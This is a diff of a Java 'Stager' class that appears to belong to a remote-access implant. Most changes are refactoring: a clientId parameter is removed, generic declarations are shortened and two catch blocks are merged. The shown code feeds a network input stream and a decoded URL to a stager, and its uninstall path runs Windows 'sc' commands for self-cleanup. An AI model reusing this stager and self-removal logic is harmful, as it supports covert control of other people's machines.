@@ -144,12 +144,10 @@ public class Stager extends ClassLoader {
 
                         //Get the input stream
                         InputStream theIS = aTimer.getInputStream();
-                        byte[] clientId = aTimer.getClientId();
-                        
                         OutputStream theOS = new ByteArrayOutputStream();
                 
                         Stager theStager = new Stager();
-                        theStager.start(theIS, theOS, decodedURL, clientId );
+                        theStager.start(theIS, theOS, decodedURL );
 
                     } else {
                         uninstall();
@@ -173,11 +171,11 @@ public class Stager extends ClassLoader {
         URL classUrl = Stager.class.getProtectionDomain().getCodeSource().getLocation();
         File theJarFile = new File( classUrl.toURI() ); 
         
-        List<String> cleanupList = new ArrayList<String>();
+        List<String> cleanupList = new ArrayList<>();
         if( !serviceName.isEmpty() && System.getProperty( "os.name" ).toLowerCase().contains("windows")){
                     
             //Tell the service to stop and restart
-            final List<String> strList = new ArrayList<String>();
+            final List<String> strList = new ArrayList<>();
             strList.add("cmd.exe");
             strList.add("/c");
             strList.add("sc qc \"" + serviceName + "\"");
@@ -241,8 +239,7 @@ public class Stager extends ClassLoader {
             try{
                 Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
                 aProcess.waitFor();
-            } catch(IOException ex){            
-            } catch (InterruptedException ex) {
+            } catch(IOException | InterruptedException ex){
             }
 
         } else {
@@ -263,11 +260,9 @@ public class Stager extends ClassLoader {
      * 
      * @param paramInputStream
      * @param paramOutputStream
-     * @param paramString
-     * @param paramArrayOfString
-     * @throws Exception 
+     * @param passedURL
      */
-    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL, byte[] clientId ) {
+    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL ) {
         
         try {
             
